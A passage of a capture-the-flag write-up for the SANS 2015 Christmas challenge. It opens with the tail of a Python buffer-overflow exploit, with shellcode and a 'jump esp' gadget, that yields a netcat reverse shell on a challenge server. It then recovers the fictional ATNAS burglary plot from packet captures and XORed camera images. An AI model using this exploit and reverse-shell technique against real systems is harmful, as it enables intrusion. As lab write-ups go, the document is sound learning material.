        payload = '\x90' * 104 # padding to overwrite the saved value of eip
        payload += '\xe4\xff\xff\xe4' # canary stack
        payload += '\x6b\x93\x04\x08' # address of our 'jump esp' gadget
        payload += '\x6b\x93\x04\x08'
        payload += shellcode
        payload += '\x90' * (200 - len(payload)) # padding to get a length of 200 bytes

        # We connect to our distant server
        sock = socket.socket()
        sock.settimeout(0.5)
        sock.connect(('54.233.105.81', 4242))

        # We receive all the data we can
        try:
            sock.recv(4096)
        except socket.timeout:
            pass

        # We enter the secret command
        sock.send('X')

        # We receive all the data we can
        try:
            for i in xrange(7):
                sock.recv(4096),
        except socket.timeout:
            pass

        # We send our payload
        sock.send(payload)

        return 0

    if __name__ == '__main__':
        main()

We launch our exploit:

.. code-block:: console

    $ ./exploit_sg05.py

And in another terminal, on the server I own:

.. code-block:: console

   $ nc -lvp 8080
   listening on [any] 8080 ...
   connect to [192.168.XX.XX] from ec2-54-233-105-81.sa-east-1.compute.amazonaws.com [54.233.105.81] 42021
   cat /gnome/www/files/gnome.conf
   Gnome Serial Number: 4CKL3R43V4
   Current config file: ./tmp/e31faee/cfg/sg.01.v1339.cfg
   Allow new subordinates?: YES
   Camera monitoring?: YES
   Audio monitoring?: YES
   Camera update rate: 60min
   Gnome mode: SuperGnome
   Gnome name: SG-05
   Allow file uploads?: YES
   Allowed file formats: .png
   Allowed file size: 512kb
   Files directory: /gnome/www/files/

The flag for this SuperGnome is :code:`4CKL3R43V4`
(`geeky reference <http://www.sou.edu/cs/lynnackler.html>`__).


Part 5: Baby, It’s Gnome Outside: *Sinister Plot and Attribution*
-----------------------------------------------------------------

We can see on the SuperGnomes some capture files, inside ZIP archives. We can
also see from a conversation on the GnomeNET on the SuperGnomes that someone
has a problem with the pictures taken by the gnomes: if some gnomes have the
same name, the uploaded images get scrambled together (the RGB pixels are
XORed with one another):

    Welcome to GnomeNET.

    I noticed an issue when there are multiple child-gnomes with the same name.
    The image feeds become scrambled together. Any way to resolve this other
    than rename the gnomes?? ~DW

    Can you provide an example of the scrambling you're seeing? ~PS

    I uploaded 'camera_feed_overlap_error.png' to SG-01. We have six factory
    test cameras all named the same. The issue occurs only when they have the
    same name. It occurs even if the cameras are not transmitting an image. ~PS

    Oh, also, in the image, 5 of the cameras are just transmitting the 'camera
    disabled' static, the 6th one was in the boss' office. The door was locked
    and the boss seemed busy, so I didn't mess with that one. ~PS

    To help me troubleshoot this, can you grab a still from all six cameras at
    the same time? Also, is this really an issue? ~DW

    I grabbed a still from 5 of the 6 cameras, again, staying out of the boss'
    office! Each cam is directed to a different SG, so each SG has one of the
    5 stills I manually snagged. I named them 'factory_cam_#.png' and pushed
    them up to the files menu. 'camera_feed_overlap_error.png' has that garbled
    image. Oh, and to answer your question. Yes. We have almost 2 million
    cameras... some of them WILL be named the same. Just fix it. ~PS

    Took a look at your issue. It looks like the camera feed collector only
    cares about the name and will merge the feeds. Looks like each pixel is
    XORed... Its going to be a lot of work to fix this. We are too late in
    the game to push a new update to all the cameras... stop naming cameras
    the same name. ~DW

So we have six images: five from some gnomes and one from the boss' office.
By recovering the five images and XORing them with the sixth image, we can
see an image from the boss' office!

By using the vulnerabilities from Part 4, we can recover the capture file
and the images.

You can download the capture files here:

* `First capture file </docs/sans-christmas-challenge-2015/20141226101055_1.pcap>`__
  (sha256: :code:`a15a537562a4c828bf9eebd09f8f99686df76a4854a741a2df63902a023a1cea`)
* `Second capture file </docs/sans-christmas-challenge-2015/20150225093040_2.pcap>`__
  (sha256: :code:`d4481450877d1468fba6c038f2a2c7b72eaab80540dda07fcc28b0a63045bd0c`)
* `Third capture file </docs/sans-christmas-challenge-2015/20151201113358_3.pcap>`__
  (sha256: :code:`f12950e677cfa1646c1c616a62d063497cf0d2cc9cea3a0167ad302a02b682c8`)
* `Fourth capture file </docs/sans-christmas-challenge-2015/20151203133818_4.pcap>`__
  (sha256: :code:`45f076467bdd69d4855d21726f398f246b7179e499fde663b4f6c7e77ba39025`)
* `Fifth capture file </docs/sans-christmas-challenge-2015/20151215161015_5.pcap>`__
  (sha256: :code:`5a637e03e9a2ea4b4fde5437eabd281d2e78c6b383a31f0e705dd9da2ec6c12a`)

You can download the images here:

* `First factory image </images/sans-christmas-challenge-2015/factory_cam_1.png>`__
* `Second factory image </images/sans-christmas-challenge-2015/factory_cam_2.png>`__
* `Third factory image </images/sans-christmas-challenge-2015/factory_cam_3.png>`__
* `Fourth factory image </images/sans-christmas-challenge-2015/factory_cam_4.png>`__
* `Fifth factory image </images/sans-christmas-challenge-2015/factory_cam_5.png>`__
* `Camera overlay image </images/sans-christmas-challenge-2015/camera_feed_overlap_error.png>`__

Let's look at the capture files first. By opening them with Wireshark,
we can see some SMTP and IMAP traffic.By using the wonderful
"Follow TCP Stream" functionnality, we can recover the full traffic.

First capture file
~~~~~~~~~~~~~~~~~~

::

    From: "c" <c@atnascorp.com>
    To: <jojo@atnascorp.com>
    Subject: GiYH Architecture
    Date: Fri, 26 Dec 2014 10:10:55 -0500

    JoJo,

    As you know, I hired you because you are the best architect in town for a
    distributed surveillance system to satisfy our rather unique business
    requirements.  We have less than a year from today to get our final plans in
    place.  Our schedule is aggressive, but realistic.

    I've sketched out the overall Gnome in Your Home architecture in the diagram
    attached below.  Please add in protocol details and other technical
    specifications to complete the architectural plans.

    Remember: to achieve our goal, we must have the infrastructure scale to
    upwards of 2 million Gnomes.  Once we solidify the architecture, you'll work
    with the hardware team to create device specs and we'll start procuring
    hardware in the February 2015 timeframe.

    I've also made significant progress on distribution deals with retailers.

    Thoughts?

    Looking forward to working with you on this project!

    -C

Attached to this email is this image:

.. image:: /images/sans-christmas-challenge-2015/giyh_architecture.jpg
    :alt: giyh_architecture.jpg
    :align: center

Second capture file
~~~~~~~~~~~~~~~~~~~

::

    From: "c" <c@atnascorp.com>
    To: <supplier@ginormouselectronicssupplier.com>
    Subject: Large Order - Immediate Attention Required
    Date: Wed, 25 Feb 2015 09:30:39 -0500

    Maratha,

    As a follow-up to our phone conversation, we'd like to proceed with an order
    of parts for our upcoming product line.  We'll need two million of each of
    the following components:

    * Ambarella S2Lm IP Camera Processor System-on-Chip (with an ARM Cortex A9
      CPU and Linux SDK)
    * ON Semiconductor AR0330: 3 MP 1/3" CMOS Digital Image Sensor
    * Atheros AR6233X Wi-Fi adapter
    * Texas Instruments TPS65053 switching power supply
    * Samsung K4B2G16460 2GB SSDR3 SDRAM
    * Samsung K9F1G08U0D 1GB NAND Flash

    Given the volume of this purchase, we fully expect the 35% discount you
    mentioned during our phone discussion.  If you cannot agree to this pricing,
    we'll place our order elsewhere.

    We need delivery of components to begin no later than April 1, 2015, with
    250,000 units coming each week, with all of them arriving no later than June
    1, 2015.


    Finally, as you know, this project requires the utmost secrecy.   Tell NO
    ONE about our order, especially any nosy law enforcement authorities.

    Regards,

    -CW

Third capture file
~~~~~~~~~~~~~~~~~~

::

    From: "c" <c@atnascorp.com>
    To: <burglerlackeys@atnascorp.com>
    Subject: All Systems Go for Dec 24, 2015
    Date: Tue, 1 Dec 2015 11:33:56 -0500

    My Burgling Friends, 

    Our long-running plan is nearly complete, and I'm writing to share the date
    when your thieving will commence!  On the morning of December 24, 2015, each
    individual burglar on this email list will receive a detailed itinerary of
    specific houses and an inventory of items to steal from each house, along
    with still photos of where to locate each item.  The message will also
    include a specific path optimized for you to hit your assigned houses
    quickly and efficiently the night of December 24, 2015 after dark.

    Further, we've selected the items to steal based on a detailed analysis of
    what commands the highest prices on the hot-items open market.  I caution
    you - steal only the items included on the list.  DO NOT waste time grabbing
    anything else from a house.  There's no sense whatsoever grabbing crumbs too
    small for a mouse!

    As to the details of the plan, remember to wear the Santa suit we provided
    you, and bring the extra large bag for all your stolen goods.

    If any children observe you in their houses that night, remember to tell
    them that you are actually "Santy Claus", and that you need to send the
    specific items you are taking to your workshop for repair.  Describe it in a
    very friendly manner, get the child a drink of water, pat him or her on the
    head, and send the little moppet back to bed.  Then, finish the deed, and
    get out of there.  It's all quite simple - go to each house, grab the loot,
    and return it to the designated drop-off area so we can resell it.  And,
    above all, avoid Mount Crumpit! 

    As we agreed, we'll split the proceeds from our sale 50-50 with each
    burglar.

    Oh, and I've heard that many of you are asking where the name ATNAS comes
    from.  Why, it's reverse SANTA, of course.  Instead of bringing presents on
    Christmas, we'll be stealing them!

    Thank you for your partnership in this endeavor. 

    Signed:

    -CLW

    President and CEO of ATNAS Corporation

Fourth capture file
~~~~~~~~~~~~~~~~~~~

::

    From: "c" <c@atnascorp.com>
    To: <psychdoctor@whovillepsychiatrists.com>
    Subject: Answer To Your Question
    Date: Thu, 3 Dec 2015 13:38:15 -0500

    Dr. O'Malley,

    In your recent email, you inquired:

    > When did you first notice your anxiety about the holiday season?

    Anxiety is hardly the word for it.  It's a deep-seated hatred, Doctor.

    Before I get into details, please allow me to remind you that we operate
    under the strictest doctor-patient confidentiality agreement in the
    business.  I have some very powerful lawyers whom I'd hate to invoke in the
    event of some leak on your part.  I seek your help because you are the best
    psychiatrist in all of Who-ville.

    To answer your question directly, as a young child (I must have been no more
    than two), I experienced a life-changing interaction.  Very late on
    Christmas Eve, I was awakened to find a grotesque green Who dressed in a
    tattered Santa Claus outfit, standing in my barren living room, attempting
    to shove our holiday tree up the chimney.  My senses heightened, I put on my
    best little-girl innocent voice and asked him what he was doing.  He
    explained that he was "Santy Claus" and needed to send the tree for repair.
    I instantly knew it was a lie, but I humored the old thief so I could escape
    to the safety of my bed.  That horrifying interaction ruined Christmas for
    me that year, and I was terrified of the whole holiday season throughout my
    teen years.

    I later learned that the green Who was known as "the Grinch" and had lost
    his mind in the middle of a crime spree to steal Christmas presents.  At the
    very moment of his criminal triumph, he had a pitiful change of heart and
    started playing all nicey-nice.  What an amateur!  When I became an adult,
    my fear of Christmas boiled into true hatred of the whole holiday season.  I
    knew that I had to stop Christmas from coming.  But how?

    I vowed to finish what the Grinch had started, but to do it at a far larger
    scale.  Using the latest technology and a distributed channel of burglars,
    we'd rob 2 million houses, grabbing their most precious gifts, and selling
    them on the open market.  We'll destroy Christmas as two million homes full
    of people all cry "BOO-HOO", and we'll turn a handy profit on the whole
    deal.

    Is this "wrong"?  I simply don't care.  I bear the bitter scars of the
    Grinch's malfeasance, and singing a little "Fahoo Fores" isn't gonna fix
    that!

    What is your advice, doctor?

    Signed,

    Cindy Lou Who

Fifth capture file
~~~~~~~~~~~~~~~~~~

::

    From: "Grinch" <grinch@who-villeisp.com>
    To: <c@atnascorp.com>
    Subject: My Apologies & Holiday Greetings
    Date: Tue, 15 Dec 2015 16:09:40 -0500

    Dear Cindy Lou,

    I am writing to apologize for what I did to you so long ago.  I wronged you
    and all the Whos down in Who-ville due to my extreme misunderstanding of
    Christmas and a deep-seated hatred.  I should have never lied to you, and I
    should have never stolen those gifts on Christmas Eve.  I realize that even
    returning them on Christmas morn didn't erase my crimes completely.  I seek
    your forgiveness.

    You see, on Mount Crumpit that fateful Christmas morning, I learned th[4 bytes missing in capture file]at
    Christmas doesn't come from a store.  In fact, I discovered that Christmas
    means a whole lot more!

    When I returned their gifts, the Whos embraced me.  They forgave.  I was
    stunned, and my heart grew even more.  Why, they even let me carve the roast
    beast!  They demonstrated to me that the holiday season is, in part, about
    forgiveness and love, and that's the gift that all the Whos gave to me that
    morning so long ago.  I honestly tear up thinking about it.

    I don't expect you to forgive me, Cindy Lou.  But, you have my deepest and
    most sincere apologies.

    And, above all, don't let my horrible actions from so long ago taint you in
    any way.  I understand you've grown into an amazing business leader.  You
    are a precious and beautiful Who, my dear.  Please use your skills wisely
    and to help and support your fellow Who, especially during the holidays.

    I sincerely wish you a holiday season full of kindness and warmth,

    --The Grinch

Let's unXOR the images
~~~~~~~~~~~~~~~~~~~~~~

With a simple Python script, we can take every image and XOR the RGB pixels
to recover the image from the boss' office:

.. code-block:: python

    #!/usr/bin/env python

    import sys
    from PIL import Image

    def main():
        # We open the camera feed overlap image
        scrambled_image = Image.open(sys.argv[6]).convert('RGB')
        scrambled_image_pixels = scrambled_image.load()
        width, height = scrambled_image.size

        # For every image found in one of the SuperGnomes
        for image in sys.argv[1:6]:
            image_pixels = Image.open(image).convert('RGB').load()
            for i in xrange(width):
                for j in xrange(height):
                    # We take the RGB components
                    r1, g1, b1 = scrambled_image_pixels[i, j]
                    r2, g2, b2 = image_pixels[i, j]
                    # And we XOR them to recover the original value
                    scrambled_image_pixels[i, j] = (r1 ^ r2, g1 ^ g2, b1 ^ b2)

        # We save the result in a new image
        scrambled_image.save('result.png', 'PNG')

        return 0

    if __name__ == '__main__':
        main()

Then, we just have to run this script:

.. code-block:: console

    $ ./unxor_images.py sg01/factory_cam_1.png sg02/factory_cam_2.png sg03/factory_cam_3.png \
        sg04/factory_cam_4.png sg05/factory_cam_5.png camera_feed_overlap_error.png

This gives us the resulting image:

.. image:: /images/sans-christmas-challenge-2015/sans_xor_image_result.png
    :alt: sans_xor_image_result.png    
    :align: center

Epilogue: ‘Twas the Gnome Before Christmas: *Wrapping It All Up*
----------------------------------------------------------------

As in every SANS Christmas Challenge, we have to answer several
questions:

1. Which commands are sent across the Gnome’s command-and-control
   channel?

The command sent to the command-and-control server are :code:`iwconfig` and
:code:`cat /tmp/iwlistscan.txt`.

2. What image appears in the photo the Gnome sent across the
   channel from the Dosis home?

We can see a picture of Josh's bedroom.

3. What operating system and CPU type are used in the Gnome?
   What type of web framework is the Gnome web interface built in?

The Gnome is running OpenWRT in the development branch.
Its CPU architecture is 32-bit ARM. The web interface is built
with NodeJS, with Jade Node as the template engine.

4. What kind of a database engine is used to support the Gnome web
   interface? What is the plaintext password stored in the Gnome database?

The database engine is MongoDB. The plaintex password is
:code:`SittingOnAShelf`.

5. What are the IP addresses of the five SuperGnomes scattered around the
   world, as verified by Tom Hessman in the Dosis neighborhood?
6. Where is each SuperGnome located geographically?

* SuperGnome01: 52.2.229.189, located in United States, Ashburn (VI)
* SuperGnome02: 52.34.3.80, located in United States, Portland (OR)
* SuperGnome03: 52.64.191.71, located in Australia, Sydney
* SuperGnome04: 52.192.152.132, located in Japan, Tokyo
* SuperGnome05: 54.233.105.81, located in Brazil, Sao Paulo

7. Please describe the vulnerabilities you discovered in the
   Gnome firmware.
8. Describe the technique you used to gain access to each SuperGnome’s
   gnome.conf file.

* SuperGnome01: Credentials stored in plaintext. Reuse of credentials.
* SuperGnome02: Arbitrary folder creation. Local file inclusion.
* SuperGnome03: NoSQL injection
* SuperGnome04: Server Side JavaScript injection
* SuperGnome05: Buffer-overflow

9. Based on evidence you recover from the SuperGnomes’ packet capture ZIP
   files and any staticky images you find, what is the nefarious plot of
   ATNAS Corporation?

The plot of the ATNAS Corporation is to sell millions of Gnomes to families,
so that they can identify valuable objects, and then come and steal it during
Christmas night, by disguising themselves as Santy Claus.

10. Who is the villain behind the nefarious plot?

The villain is none other that
`Cindy Lou Who <http://seuss.wikia.com/wiki/Cindy_Lou_Who>`__. After being
traumatised by the Grinch stealing Christmas, she has developped a deep
hatred for this holiday.

Conclusion
----------

I really enjoyed doing this challenge, because it allowed me to develop
my skills in technologies I'm not familiar with, such as NoSQL database
engines, or buffer-overflow (something I should really work on).

Many thanks to the SANS institute for this incredible Christmas Challenge!
